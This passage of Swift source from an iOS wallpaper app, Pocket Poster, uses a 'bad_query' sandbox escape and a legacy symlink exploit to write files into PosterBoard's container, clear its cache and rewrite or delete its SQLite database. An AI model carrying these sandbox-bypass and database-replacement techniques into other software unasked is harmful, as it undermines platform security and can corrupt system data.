//
//  SymHandler.swift
//  Pocket Poster
//
//  Created by lemin on 5/31/25.
//

import Foundation
import SQLite3
import Darwin
import CoreFoundation

class SymHandler {
    // MARK: URL Getter Operations
    static func getDocumentsDirectory() -> URL {
        let paths = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)
        let documentsDirectory = paths[0]
        return documentsDirectory
    }

    static func getLCDocumentsDirectory() -> URL {
        let lcPath = ProcessInfo.processInfo.environment["LC_HOME_PATH"]
        if let lcPath = lcPath {
            return URL(fileURLWithPath: "\(lcPath)/Documents")
        }
        return getDocumentsDirectory()
    }

    static func getPosterBoardHashURL() -> URL {
        return getLCDocumentsDirectory().appendingPathComponent("NuggetPosterBoardHash")
    }
    static func getCarPlayHashURL() -> URL {
        return getLCDocumentsDirectory().appendingPathComponent("NuggetCarPlayWallpaperHash")
    }

    private static func getSymlinkURL() -> URL {
        return getLCDocumentsDirectory().appendingPathComponent(".Trash", conformingTo: .symbolicLink)
    }

    /// Prefer bad_query (iOS 26/27 sandbox escape); fall back to .Trash symlink exploit.
    static var prefersBadQuery: Bool {
        BadQuery.isAvailable
    }

    // MARK: Symlink Creation (legacy exploit for older iOS)
    static func createSymlink(to path: String) throws -> URL {
        // returns the url of the symlink
        let symURL = getSymlinkURL()
        cleanup()

        // create the symlink to the hashed app folder
        try FileManager.default.createSymbolicLink(at: symURL, withDestinationURL: URL(fileURLWithPath: path, isDirectory: true))

        return symURL
    }

    static func createAppSymlink(for appHash: String) throws -> URL {
        return try createSymlink(to: "/var/mobile/Containers/Data/Application/\(appHash)")
    }

    static func getExtensionVersion() -> String {
        if #available(iOS 17.0, *) {
            return "61"
        }
        return "59"
    }

    static func createDescriptorsSymlink(appHash: String, ext: String) throws -> URL {
        // create a symlink directly to the descriptors
        let extVer = SymHandler.getExtensionVersion()
        print("linking to \(appHash)/Library/Application Support/PRBPosterExtensionDataStore/\(extVer)/Extensions/\(ext)/descriptors")
        return try createAppSymlink(for: "\(appHash)/Library/Application Support/PRBPosterExtensionDataStore/\(extVer)/Extensions/\(ext)/descriptors")
    }

    // MARK: Direct write via bad_query

    /// Copy descriptor folders into PosterBoard descriptors using sandbox escape.
    /// Returns the UUID folder names that were written (used by writeToPosterBoardDB).
    @discardableResult
    static func writeDescriptorsViaBadQuery(appHash: String, ext: String, descriptorFolders: [URL]) throws -> [String] {
        let destPath = BadQuery.descriptorsPath(appHash: appHash, ext: ext)
        print("bad_query writing to \(destPath)")

        // Ensure descriptors directory exists — retry up to 3 times
        var ensureError: Error?
        for attempt in 0..<3 {
            if attempt > 0 { Thread.sleep(forTimeInterval: 0.3) }
            do {
                try BadQuery.ensureDirectory(at: destPath)
                ensureError = nil
                break
            } catch {
                ensureError = error
            }
        }
        if let err = ensureError { throw err }

        let fm = FileManager.default
        var writtenUUIDs: [String] = []
        for descr in descriptorFolders {
            guard descr.lastPathComponent != "__MACOSX" else { continue }
            let destName = UUID().uuidString
            let destURL = URL(fileURLWithPath: destPath).appendingPathComponent(destName)

            var lastError: Error?
            for attempt in 0..<3 {
                if attempt > 0 {
                    try? fm.removeItem(at: destURL)   // clean up partial copy before retry
                    Thread.sleep(forTimeInterval: 0.3)
                }
                // consume is inside do-catch so a bad_query token failure also triggers retry
                do {
                    let handle = try BadQuery.consume(path: destPath, create: true)
                    defer { handle.release() }
                    if fm.fileExists(atPath: destURL.path) {
                        try fm.removeItem(at: destURL)
                    }
                    try fm.copyItem(at: descr, to: destURL)
                    // Write Wallpaper.plist using the full UUID as identifier and the correct
                    // family so WKWallpaperBundle.shouldLoadWallpaperBundleAtURL: accepts us.
                    // identifier MUST match the folder name exactly (full UUID, not truncated).
                    let wpMeta: [String: Any] = [
                        "identifier": destName,
                        "version": 1,
                        "name": "Custom Wallpaper",
                        "family": "com.apple.WallpaperKit.CollectionsPoster",
                        "wantsDeviceMotion": false,
                        "isOffloaded": false,
                        "logicalScreenClass": 0
                    ]
                    if let wpData = try? PropertyListSerialization.data(
                        fromPropertyList: wpMeta, format: .binary, options: 0) {
                        try? wpData.write(to: destURL.appendingPathComponent("Wallpaper.plist"))
                    }
                    lastError = nil
                    break
                } catch {
                    lastError = error
                }
            }
            if let err = lastError { throw err }
            writtenUUIDs.append(destName)
        }

        // Write Collection.plist to the descriptors/ directory so that
        // WKWallpaperRepresentingCollection.shouldLoadWallpaperCollectionAtURL: accepts it.
        // iOS 26.5 _loadCollections calls this class method for each candidate directory;
        // without Collection.plist the entire collection is silently skipped.
        let collHandle = try? BadQuery.consume(path: destPath, create: true)
        defer { collHandle?.release() }
        let collMeta: [String: Any] = [
            "wallpaperCollectionIdentifier": "com.custom.pocketposter.collection",
            "displayName": "Custom Wallpapers",
            "hiddenFromPicker": false,
            "wallpapersShareBaseAppearance": false,
            "depthEffectDisabled": false,
            "motionEffectsDisabled": false,
            "disableRotation": false
        ]
        if let plistData = try? PropertyListSerialization.data(
            fromPropertyList: collMeta, format: .xml, options: 0) {
            let collPlistURL = URL(fileURLWithPath: destPath)
                .appendingPathComponent("Collection.plist")
            try? plistData.write(to: collPlistURL)
        }

        return writtenUUIDs
    }

    /// Register wallpaper descriptors in PosterBoard's SQLite database so they
    /// appear in the collections picker immediately after the first respring.
    ///
    /// Tries four approaches in order until one succeeds:
    ///   A. Copy PB's DB → remove WAL copy → open READWRITE → insert → checkpoint → replace PB's DB
    ///   B. Copy PB's DB → keep WAL copy → open READWRITE → insert → checkpoint → replace PB's DB
    ///   C. Open original PB DB read-only with immutable URI (skips -shm) → read max values →
    ///      create fresh DB at tmp → insert rows → replace PB's DB (existing PB wallpapers
    ///      may need one respring to re-register via PB's own filesystem scan)
    ///   D. Nuclear: delete PB's DB entirely so PosterBoard is forced to do a full filesystem
    ///      scan on next launch — all descriptor folders (including ours) are re-discovered.
    static func writeToPosterBoardDB(appHash: String, entries: [(uuid: String, ext: String)]) {
        guard !entries.isEmpty else { return }

        let dbPath = BadQuery.applicationContainerPath(appHash: appHash)
            + "/Library/Application Support/PRBPosterExtensionDataStore/PBFPosterExtensionDataStoreSQLiteDatabase.sqlite3"
        let walPath = dbPath + "-wal"
        let shmPath = dbPath + "-shm"
        let dbDir   = (dbPath as NSString).deletingLastPathComponent

        let tmpDBPath  = (NSTemporaryDirectory() as NSString).appendingPathComponent("pp_pb_db.sqlite3")
        let tmpWALPath = tmpDBPath + "-wal"

        var diag: [String] = ["=== writeToPosterBoardDB ===", "appHash=\(appHash) entries=\(entries.count)"]
        defer {
            let text = diag.joined(separator: "\n")
            try? text.write(to: getLCDocumentsDirectory().appendingPathComponent("pp_db_diag.txt"),
                            atomically: true, encoding: .utf8)
        }

        let fm = FileManager.default

        // ── pre-run: inspect PB's DB BEFORE we touch anything ────────────────
        // This tells us whether the previous apply's DB modification survived the respring.
        if let h = try? BadQuery.consume(path: dbPath, create: true) {
            defer { h.release() }
            if let attrs = try? fm.attributesOfItem(atPath: dbPath) {
                let sz = attrs[.size] as? Int ?? -1
                diag.append("pre-run PB DB size=\(sz)")
            } else {
                diag.append("pre-run PB DB: not found / stat failed")
            }
            // Search raw bytes for each entry UUID from the previous run to check survival
            if let data = fm.contents(atPath: dbPath) {
                for entry in entries {
                    let found = data.range(of: Data(entry.uuid.utf8)) != nil
                    diag.append("pre-run uuid \(entry.uuid.prefix(8)) in DB raw bytes: \(found)")
                }
            } else {
                diag.append("pre-run: fm.contents(dbPath) = nil")
            }
        }

        // ── Probe PB's actual directory structure ──────────────────────────────
        // List Library/Application Support to find the real directory names PB uses.
        // PRBPosterExtensionDataStore may have been renamed in iOS 26.5 WallpaperKit.
        let pbLibAS = BadQuery.applicationContainerPath(appHash: appHash) + "/Library/Application Support"
        if let libH = try? BadQuery.consume(path: pbLibAS, create: true) {
            defer { libH.release() }
            let tops = (try? fm.contentsOfDirectory(atPath: pbLibAS)) ?? []
            diag.append("PB LibAS: \(tops.joined(separator: ","))")
            for top in tops where !top.hasPrefix(".") {
                let tp = "\(pbLibAS)/\(top)"
                if let th = try? BadQuery.consume(path: tp, create: true) {
                    defer { th.release() }
                    let subs = (try? fm.contentsOfDirectory(atPath: tp)) ?? []
                    diag.append("  \(top): \(subs.joined(separator: ","))")
                    for sub in subs where !sub.hasPrefix(".") {
                        let sp = "\(tp)/\(sub)"
                        if let sh = try? BadQuery.consume(path: sp, create: true) {
                            defer { sh.release() }
                            let items = (try? fm.contentsOfDirectory(atPath: sp)) ?? []
                            diag.append("    \(sub): \(items.joined(separator: ","))")
                            // One more level to see inside Extensions/
                            for item in items where !item.hasPrefix(".") {
                                let ip = "\(sp)/\(item)"
                                if let ih = try? BadQuery.consume(path: ip, create: true) {
                                    defer { ih.release() }
                                    let itemContents = (try? fm.contentsOfDirectory(atPath: ip)) ?? []
                                    diag.append("      \(item): \(itemContents.joined(separator: ","))")
                                }
                            }
                        }
                    }
                }
            }
        }

        // ── Show what's inside our written descriptor folder ──────────────────
        let ourDescPath = BadQuery.descriptorsPath(appHash: appHash, ext: "com.apple.WallpaperKit.CollectionsPoster")
        if let dH = try? BadQuery.consume(path: ourDescPath, create: true) {
            defer { dH.release() }
            let uuids = (try? fm.contentsOfDirectory(atPath: ourDescPath)) ?? []
            diag.append("ourDesc[\(uuids.count)]: \(uuids.joined(separator: ","))")
            if let firstUUID = uuids.first(where: { !$0.hasPrefix(".") && $0 != "Collection.plist" }) {
                let fp = "\(ourDescPath)/\(firstUUID)"
                if let fH = try? BadQuery.consume(path: fp, create: true) {
                    defer { fH.release() }
                    let files = (try? fm.contentsOfDirectory(atPath: fp)) ?? []
                    diag.append("  \(firstUUID): \(files.joined(separator: ","))")
                    for f in files where !f.hasPrefix(".") {
                        let filePath = "\(fp)/\(f)"
                        if let data = fm.contents(atPath: filePath) {
                            if let s = String(data: data, encoding: .utf8) {
                                diag.append("    \(f): \(s.prefix(200))")
                            } else if let plist = try? PropertyListSerialization.propertyList(
                                from: data, options: [], format: nil) {
                                diag.append("    \(f) [plist]: \(String(describing: plist).prefix(300))")
                            } else {
                                diag.append("    \(f): [bin \(data.count)b]")
                            }
                        } else if let subH = try? BadQuery.consume(path: filePath, create: true) {
                            defer { subH.release() }
                            let subItems = (try? fm.contentsOfDirectory(atPath: filePath)) ?? []
                            diag.append("    \(f)/: \(subItems.joined(separator: ","))")
                            for si in subItems where !si.hasPrefix(".") {
                                let siPath = "\(filePath)/\(si)"
                                if let siH = try? BadQuery.consume(path: siPath, create: true) {
                                    defer { siH.release() }
                                    let siItems = (try? fm.contentsOfDirectory(atPath: siPath)) ?? []
                                    diag.append("      \(f)/\(si)/: \(siItems.joined(separator: ","))")
                                    for item in siItems where !item.hasPrefix(".") {
                                        let itemPath = "\(siPath)/\(item)"
                                        if let ih = try? BadQuery.consume(path: itemPath, create: true) {
                                            defer { ih.release() }
                                            if let iData = fm.contents(atPath: itemPath) {
                                                if let s = String(data: iData, encoding: .utf8) {
                                                    diag.append("        \(f)/\(si)/\(item): \(s.prefix(100))")
                                                } else if let pl = try? PropertyListSerialization.propertyList(from: iData, options: [], format: nil) {
                                                    diag.append("        \(f)/\(si)/\(item) [pl]: \(String(describing: pl).prefix(200))")
                                                } else {
                                                    diag.append("        \(f)/\(si)/\(item): [bin \(iData.count)b]")
                                                }
                                            } else {
                                                let dd = (try? fm.contentsOfDirectory(atPath: itemPath)) ?? []
                                                diag.append("        \(f)/\(si)/\(item)/: \(dd.joined(separator: ","))")
                                            }
                                        }
                                    }
                                } else if let siData = fm.contents(atPath: siPath) {
                                    if let s = String(data: siData, encoding: .utf8) {
                                        diag.append("      \(f)/\(si): \(s.prefix(100))")
                                    } else if let pl = try? PropertyListSerialization.propertyList(from: siData, options: [], format: nil) {
                                        diag.append("      \(f)/\(si) [pl]: \(String(describing: pl).prefix(200))")
                                    } else {
                                        diag.append("      \(f)/\(si): [bin \(siData.count)b]")
                                    }
                                }
                            }
                        }
                    }
                }
            }
        } else {
            diag.append("ourDesc: not accessible")
        }

        // ── Drill into working extension bundles to discover the correct format ───
        // Other extensions (Gradient, LegacyPoster, PhotosAmbient) are known-working.
        // Their descriptor UUID folder structure reveals what PB's _loadCollections accepts.
        let extBasePath = BadQuery.applicationContainerPath(appHash: appHash) +
            "/Library/Application Support/PRBPosterExtensionDataStore/61/Extensions"
        for extName in ["com.apple.WallpaperKit.CollectionsPoster",
                        "com.apple.GradientPoster.GradientPosterExtension",
                        "com.apple.PaperBoard.LegacyPoster",
                        "com.apple.PhotosUIPrivate.PhotosAmbientPosterProvider"] {
            let descPath = "\(extBasePath)/\(extName)/descriptors"
            guard let extDH = try? BadQuery.consume(path: descPath, create: true) else {
                diag.append("wExt[\(extName.prefix(28))]: no access"); continue
            }
            defer { extDH.release() }
            let uuidList = ((try? fm.contentsOfDirectory(atPath: descPath)) ?? [])
                .filter { !$0.hasPrefix(".") && $0 != "Collection.plist" }
            diag.append("wExt[\(extName.prefix(35))][\(uuidList.count)]")
            guard let firstUUID = uuidList.first else { diag.append("  (empty)"); continue }
            let bundlePath = "\(descPath)/\(firstUUID)"
            guard let bH = try? BadQuery.consume(path: bundlePath, create: true) else { continue }
            defer { bH.release() }
            let bundleFiles = (try? fm.contentsOfDirectory(atPath: bundlePath)) ?? []
            diag.append("  \(firstUUID.prefix(8)) topFiles: \(bundleFiles.joined(separator: ","))")
            for bf in bundleFiles where !bf.hasPrefix(".") {
                let bfPath = "\(bundlePath)/\(bf)"
                if let bfData = fm.contents(atPath: bfPath) {
                    if let s = String(data: bfData, encoding: .utf8) {
                        diag.append("    \(bf): \(s.prefix(200))")
                    } else if let pl = try? PropertyListSerialization.propertyList(from: bfData, options: [], format: nil) {
                        diag.append("    \(bf) [pl]: \(String(describing: pl).prefix(300))")
                    } else {
                        diag.append("    \(bf): [bin \(bfData.count)b]")
                    }
                } else if let subH = try? BadQuery.consume(path: bfPath, create: true) {
                    defer { subH.release() }
                    let subs = (try? fm.contentsOfDirectory(atPath: bfPath)) ?? []
                    diag.append("    \(bf)/: \(subs.joined(separator: ","))")
                    for sub in subs where !sub.hasPrefix(".") {
                        let subPath = "\(bfPath)/\(sub)"
                        if let sh = try? BadQuery.consume(path: subPath, create: true) {
                            defer { sh.release() }
                            let subItems = (try? fm.contentsOfDirectory(atPath: subPath)) ?? []
                            diag.append("      \(bf)/\(sub)/: \(subItems.joined(separator: ","))")
                            for si in subItems where !si.hasPrefix(".") {
                                let siPath = "\(subPath)/\(si)"
                                if let siH = try? BadQuery.consume(path: siPath, create: true) {
                                    defer { siH.release() }
                                    if let siData = fm.contents(atPath: siPath) {
                                        if let s = String(data: siData, encoding: .utf8) {
                                            diag.append("        \(bf)/\(sub)/\(si): \(s.prefix(100))")
                                        } else if let pl = try? PropertyListSerialization.propertyList(from: siData, options: [], format: nil) {
                                            diag.append("        \(bf)/\(sub)/\(si) [pl]: \(String(describing: pl).prefix(200))")
                                        } else {
                                            diag.append("        \(bf)/\(sub)/\(si): [bin \(siData.count)b]")
                                        }
                                    } else {
                                        let dd = (try? fm.contentsOfDirectory(atPath: siPath)) ?? []
                                        diag.append("        \(bf)/\(sub)/\(si)/: \(dd.joined(separator: ","))")
                                    }
                                }
                            }
                        } else if let subData = fm.contents(atPath: subPath) {
                            if let s = String(data: subData, encoding: .utf8) {
                                diag.append("      \(bf)/\(sub): \(s.prefix(100))")
                            } else if let pl = try? PropertyListSerialization.propertyList(from: subData, options: [], format: nil) {
                                diag.append("      \(bf)/\(sub) [pl]: \(String(describing: pl).prefix(200))")
                            } else {
                                diag.append("      \(bf)/\(sub): [bin \(subData.count)b]")
                            }
                        }
                    }
                }
            }
        }

        // ── GalleryCache — NSKeyedUnarchiver (WK loaded) + raw string extraction ─
        dlopen("/System/Library/PrivateFrameworks/WallpaperKit.framework/WallpaperKit", RTLD_NOW)
        let galleryCachePath = BadQuery.applicationContainerPath(appHash: appHash) +
            "/Library/Application Support/PRBPosterExtensionDataStore/61/GalleryCache"
        if let gcH = try? BadQuery.consume(path: galleryCachePath, create: true) {
            defer { gcH.release() }
            let gcFiles = (try? fm.contentsOfDirectory(atPath: galleryCachePath)) ?? []
            diag.append("GalleryCache files: \(gcFiles.joined(separator: ","))")
            for gcFile in gcFiles where gcFile.hasSuffix(".plist") {
                let gcFilePath = "\(galleryCachePath)/\(gcFile)"
                guard let gcData = fm.contents(atPath: gcFilePath) else { continue }
                diag.append("GalleryCacheFile \(gcFile): \(gcData.count)b")
                if let gcPlist = try? PropertyListSerialization.propertyList(from: gcData, options: [], format: nil) {
                    func extractStrs(_ v: Any) -> [String] {
                        if let s = v as? String, s.count >= 6 { return [s] }
                        if let a = v as? [Any] { return a.flatMap { extractStrs($0) } }
                        if let d = v as? [String: Any] {
                            return d.values.flatMap { extractStrs($0) } + d.keys.filter { $0.count >= 6 }
                        }
                        if let nd = v as? NSDictionary {
                            var r: [String] = []
                            nd.enumerateKeysAndObjects { k, val, _ in
                                if let ks = k as? String, ks.count >= 6 { r.append(ks) }
                                r.append(contentsOf: extractStrs(val))
                            }
                            return r
                        }
                        return []
                    }
                    let allS = extractStrs(gcPlist)
                    let interestingS = allS.filter { s in
                        let l = s.lowercased()
                        return l.contains("wallpaper") || l.contains("collection") ||
                               l.contains("poster") || l.contains("bundle") ||
                               l.contains("com.apple") ||
                               (s.count == 36 && s.filter { $0 == "-" }.count == 4)
                    }
                    diag.append("  gcStrs[\(interestingS.count)]: \(interestingS.prefix(50).joined(separator: "|"))")
                }
            }
        } else {
            diag.append("GalleryCache: not accessible")
        }

        // ── Delete GalleryCache so PB rescans Extensions/ on next launch ────────
        // PB caches its collection list; if the cache is fresh, it won't discover
        // new descriptor folders until its background rescan fires (~1-2 min).
        // Deleting the cache forces a full filesystem scan immediately on restart.
        let gcDeletePath = BadQuery.applicationContainerPath(appHash: appHash) +
            "/Library/Application Support/PRBPosterExtensionDataStore/61/GalleryCache"
        if let gcDelH = try? BadQuery.consume(path: gcDeletePath, create: true) {
            defer { gcDelH.release() }
            let gcFiles = (try? fm.contentsOfDirectory(atPath: gcDeletePath)) ?? []
            var gcDelCount = 0
            for f in gcFiles where !f.hasPrefix(".") {
                if (try? fm.removeItem(atPath: "\(gcDeletePath)/\(f)")) != nil { gcDelCount += 1 }
            }
            diag.append("GalleryCache cleared: \(gcDelCount)/\(gcFiles.count)")
        } else {
            diag.append("GalleryCache: no access for deletion")
        }

        // ── _createWallpaperBundleInDirectory: diagnostic ───────────────────────
        // Call Apple's own bundle-creation method in a tmp dir to discover the
        // exact Wallpaper.plist keys that shouldLoadWallpaperBundleAtURL: requires.
        let refBundleDir = NSTemporaryDirectory().appending("pp_refbundle_\(arc4random())")
        try? fm.createDirectory(atPath: refBundleDir, withIntermediateDirectories: true, attributes: nil)
        if let bCls = NSClassFromString("WKWallpaperBundle"),
           let bMeta = object_getClass(bCls as AnyObject) {
            let createSel = NSSelectorFromString("_createWallpaperBundleInDirectory:version:identifier:name:family:wantsDeviceMotion:isOffloaded:logicalScreenClass:thumbnailImageURL:adjustmentTraits:preferredProminentColors:preferredTitleColors:assetMapping:")
            if let m = class_getInstanceMethod(bMeta, createSel) {
                typealias CreateFn = @convention(c) (AnyObject, Selector, NSURL, Int, NSString, NSString, NSString, Bool, Bool, Int, AnyObject?, AnyObject?, AnyObject?, AnyObject?, AnyObject?) -> AnyObject?
                let fn = unsafeBitCast(method_getImplementation(m), to: CreateFn.self)
                _ = fn(bCls as AnyObject, createSel,
                       URL(fileURLWithPath: refBundleDir) as NSURL,
                       1, "pp-diag-ref" as NSString, "Diag WP" as NSString,
                       "com.apple.WallpaperKit.CollectionsPoster" as NSString,
                       false, false, 0, nil, nil, nil, nil, nil)
                let refFiles = (try? fm.contentsOfDirectory(atPath: refBundleDir)) ?? []
                diag.append("createBundle files: \(refFiles.joined(separator: ","))")
                let wpPath = refBundleDir + "/Wallpaper.plist"
                if let wpData = fm.contents(atPath: wpPath) {
                    if let pl = try? PropertyListSerialization.propertyList(from: wpData, options: [], format: nil),
                       let jsonData = try? JSONSerialization.data(withJSONObject: pl, options: .prettyPrinted),
                       let jsonStr = String(data: jsonData, encoding: .utf8) {
                        diag.append("refWP: \(jsonStr.prefix(1200))")
                    } else if let s = String(data: wpData, encoding: .utf8) {
                        diag.append("refWP(xml): \(s.prefix(1200))")
                    } else {
                        diag.append("refWP: \(wpData.count)b binary no-decode")
                    }
                } else {
                    diag.append("createBundle: no Wallpaper.plist written")
                }
            } else {
                diag.append("createBundle: selector not found on WKWallpaperBundle")
            }
        } else {
            diag.append("createBundle: WKWallpaperBundle not found")
        }
        try? fm.removeItem(atPath: refBundleDir)

        try? fm.removeItem(atPath: tmpDBPath)
        try? fm.removeItem(atPath: tmpWALPath)

        // ── sandbox extensions ────────────────────────────────────────────────
        guard let dbReadHandle = try? BadQuery.consume(path: dbPath, create: true) else {
            diag.append("FAIL consume DB file"); return
        }
        defer { dbReadHandle.release() }
        let walReadHandle = try? BadQuery.consume(path: walPath, create: true)
        defer { walReadHandle?.release() }

        guard fm.fileExists(atPath: dbPath) else {
            diag.append("FAIL DB not found at \(dbPath)"); return
        }

        // ── copy PB's DB into our tmp ─────────────────────────────────────────
        guard (try? fm.copyItem(atPath: dbPath, toPath: tmpDBPath)) != nil else {
            diag.append("FAIL copyItem main DB"); return
        }
        try? fm.setAttributes([.posixPermissions: NSNumber(value: 0o644)], ofItemAtPath: tmpDBPath)

        // ── diagnostics ───────────────────────────────────────────────────────
        if let attrs = try? fm.attributesOfItem(atPath: tmpDBPath) {
            let perms  = attrs[.posixPermissions] as? Int ?? -1
            let prot   = attrs[FileAttributeKey.protectionKey] as? String ?? "n/a"
            let size   = attrs[.size] as? Int ?? -1
            diag.append("copy: perms=\(String(perms, radix: 8)) prot=\(prot) size=\(size)")
        }
        if let data = fm.contents(atPath: tmpDBPath), data.count >= 20 {
            let magic = data.prefix(16).map { String(format: "%02x", $0) }.joined()
            diag.append("header: \(magic)  WAL_mode_bytes=\(data[18]).\(data[19])")
        }
        let posixFd = Darwin.open(tmpDBPath, O_RDWR)
        let posixErr = Darwin.errno
        diag.append("posix O_RDWR: fd=\(posixFd) errno=\(posixErr)")
        if posixFd >= 0 { Darwin.close(posixFd) }
        let freshTestPath = (NSTemporaryDirectory() as NSString).appendingPathComponent("pp_sqlitetest_\(arc4random()).sqlite3")
        var ftDb: OpaquePointer?
        let ftRC = sqlite3_open_v2(freshTestPath, &ftDb, SQLITE_OPEN_READWRITE | SQLITE_OPEN_CREATE, nil)
        let ftErr = Darwin.errno
        if ftRC == SQLITE_OK { sqlite3_close(ftDb) }
        try? fm.removeItem(atPath: freshTestPath)
        diag.append("sqlite3 create-test: rc=\(ftRC) errno=\(ftErr)")
        let writeTestPath = (NSTemporaryDirectory() as NSString).appendingPathComponent("pp_writetest")
        let writeTestOK = fm.createFile(atPath: writeTestPath, contents: Data([1]), attributes: nil)
        try? fm.removeItem(atPath: writeTestPath)
        diag.append("fm.createFile in tmpDir: \(writeTestOK)")
        diag.append("isWritable copy: \(fm.isWritableFile(atPath: tmpDBPath))")

        // ── also copy WAL ─────────────────────────────────────────────────────
        var walCopied = false
        if fm.fileExists(atPath: walPath) {
            if (try? fm.copyItem(atPath: walPath, toPath: tmpWALPath)) != nil {
                try? fm.setAttributes([.posixPermissions: NSNumber(value: 0o644)], ofItemAtPath: tmpWALPath)
                walCopied = true
            }
        }
        diag.append("WAL copied=\(walCopied)")

        // ── helper: run insert SQL into an open db handle ─────────────────────
        func insertEntries(db: OpaquePointer, seq: inout Int64, maxSortKey: inout Int64,
                           src: String) -> Int {
            let now = Date().timeIntervalSince1970
            var n = 0
            for entry in entries {
                seq += 1; maxSortKey += 1
                let payload = "{\"creationDate\":\(now),\"extensionAvailable\":true," +
                    "\"attributeType\":\"PRPosterRoleAttributeTypeUsageMetadata\"," +
                    "\"lastActivatedDate\":\(now + 0.001),\"lastSelectedDate\":\(now + 0.0001)}"
                let r1 = sqlite3_exec(db,
                    "INSERT OR IGNORE INTO poster (posterId, UUID, providerId) " +
                    "VALUES (\(seq), '\(entry.uuid)', '\(entry.ext)')", nil, nil, nil)
                let r2 = sqlite3_exec(db,
                    "INSERT OR IGNORE INTO posterAttributes (posterUUID, roleId, attributeIdentifier, attributePayload) " +
                    "VALUES ('\(entry.uuid)', 'PRPosterRoleLockScreen', 'PRPosterRoleAttributeTypeUsageMetadata', '\(payload)')",
                    nil, nil, nil)
                let r3 = sqlite3_exec(db,
                    "INSERT OR IGNORE INTO posterRoleMembership (posterUUID, roleId, roleSortKey) " +
                    "VALUES ('\(entry.uuid)', 'PRPosterRoleLockScreen', \(maxSortKey))", nil, nil, nil)
                diag.append("\(src) entry \(entry.uuid.prefix(8)): p=\(r1) a=\(r2) m=\(r3)")
                if r1 == SQLITE_OK && r2 == SQLITE_OK && r3 == SQLITE_OK { n += 1 }
            }
            return n
        }

        // ── helper: replace PB's DB files with a file at srcPath ─────────────
        func replaceDB(srcPath: String) -> Bool {
            guard let dirHandle = try? BadQuery.consume(path: dbDir, create: true) else {
                diag.append("FAIL consume dbDir"); return false
            }
            defer { dirHandle.release() }
            try? fm.removeItem(atPath: walPath)
            try? fm.removeItem(atPath: shmPath)
            try? fm.removeItem(atPath: dbPath)
            do {
                try fm.copyItem(atPath: srcPath, toPath: dbPath)
                diag.append("OK DB replaced from \(srcPath)")
                return true
            } catch {
                diag.append("FAIL replaceDB: \(error)"); return false
            }
        }

        // ── helper: read max posterId / sortKey from an open db ───────────────
        func readMaxValues(db: OpaquePointer) -> (seq: Int64, sortKey: Int64) {
            var stmt: OpaquePointer?
            var seq: Int64 = 0
            var sk: Int64 = 0
            if sqlite3_prepare_v2(db, "SELECT MAX(posterId) FROM poster", -1, &stmt, nil) == SQLITE_OK,
               sqlite3_step(stmt) == SQLITE_ROW,
               sqlite3_column_type(stmt, 0) != SQLITE_NULL { seq = sqlite3_column_int64(stmt, 0) }
            sqlite3_finalize(stmt); stmt = nil
            if sqlite3_prepare_v2(db,
                "SELECT MAX(roleSortKey) FROM posterRoleMembership WHERE roleId='PRPosterRoleLockScreen'",
                -1, &stmt, nil) == SQLITE_OK,
               sqlite3_step(stmt) == SQLITE_ROW,
               sqlite3_column_type(stmt, 0) != SQLITE_NULL { sk = sqlite3_column_int64(stmt, 0) }
            sqlite3_finalize(stmt)
            return (seq, sk)
        }

        var didSucceed = false

        // ══════════════════════════════════════════════════════════════════════
        // APPROACH INPLACE — open existing DB with READWRITE, no delete/recreate.
        // Preserves the file's inode, so any kqueue/dispatch_source watch that
        // posterboardd holds on its DB file fires when we write to it.
        // ══════════════════════════════════════════════════════════════════════
        if !didSucceed, let ipDirH = try? BadQuery.consume(path: dbDir, create: true) {
            defer { ipDirH.release() }
            if fm.fileExists(atPath: dbPath) {
                var ipDb: OpaquePointer?
                let ipRC = sqlite3_open_v2(dbPath, &ipDb, SQLITE_OPEN_READWRITE, nil)
                let ipErr = Darwin.errno
                diag.append("[InPlace] open READWRITE: rc=\(ipRC) errno=\(ipErr)")
                if ipRC == SQLITE_OK, let db = ipDb {
                    sqlite3_busy_timeout(db, 2000)
                    sqlite3_exec(db, "PRAGMA wal_checkpoint(TRUNCATE)", nil, nil, nil)
                    var (seq, sk) = readMaxValues(db: db)
                    diag.append("[InPlace] maxPosterId=\(seq) maxSortKey=\(sk)")
                    let n = insertEntries(db: db, seq: &seq, maxSortKey: &sk, src: "InPlace")
                    sqlite3_exec(db, "PRAGMA wal_checkpoint(TRUNCATE)", nil, nil, nil)
                    sqlite3_close(db)
                    if n > 0 { didSucceed = true; diag.append("[InPlace] SUCCESS") }
                } else {
                    if let db = ipDb { sqlite3_close(db) }
                    diag.append("[InPlace] open failed — falling to Direct")
                }
            } else {
                diag.append("[InPlace] DB absent — falling to Direct")
            }
        }

        // ══════════════════════════════════════════════════════════════════════
        // APPROACH DIRECT — delete PB's DB and create fresh at same path.
        // ══════════════════════════════════════════════════════════════════════
        if !didSucceed, let dirHandle = try? BadQuery.consume(path: dbDir, create: true) {
            // Delete existing DB/WAL/SHM so dbPath does not exist
            try? fm.removeItem(atPath: walPath)
            try? fm.removeItem(atPath: shmPath)
            try? fm.removeItem(atPath: dbPath)

            // Test: can POSIX create a new file directly in PB's container?
            let posPBFd = Darwin.open(dbPath, O_CREAT | O_WRONLY, 0o644)
            let posPBErr = Darwin.errno
            diag.append("[Direct] POSIX O_CREAT in PB dir: fd=\(posPBFd) errno=\(posPBErr)")
            if posPBFd >= 0 {
                Darwin.close(posPBFd)
                try? fm.removeItem(atPath: dbPath) // remove the test stub before SQLite creates it
            }

            // Try creating SQLite DB directly at PB's path
            var db: OpaquePointer?
            let rc = sqlite3_open_v2(dbPath, &db, SQLITE_OPEN_READWRITE | SQLITE_OPEN_CREATE, nil)
            let err = Darwin.errno
            diag.append("[Direct] sqlite3_open CREATE at PB path: rc=\(rc) errno=\(err)")
            if rc == SQLITE_OK, let db = db {
                sqlite3_exec(db, "CREATE TABLE IF NOT EXISTS poster (posterId INTEGER, UUID TEXT NOT NULL, providerId TEXT NOT NULL)", nil, nil, nil)
                sqlite3_exec(db, "CREATE TABLE IF NOT EXISTS posterAttributes (posterUUID TEXT NOT NULL, roleId TEXT NOT NULL, attributeIdentifier TEXT NOT NULL, attributePayload TEXT)", nil, nil, nil)
                sqlite3_exec(db, "CREATE TABLE IF NOT EXISTS posterRoleMembership (posterUUID TEXT NOT NULL, roleId TEXT NOT NULL, roleSortKey INTEGER)", nil, nil, nil)
                var seq: Int64 = 0; var sk: Int64 = 0
                let n = insertEntries(db: db, seq: &seq, maxSortKey: &sk, src: "Direct")
                sqlite3_exec(db, "PRAGMA wal_checkpoint(TRUNCATE)", nil, nil, nil)
                sqlite3_close(db)
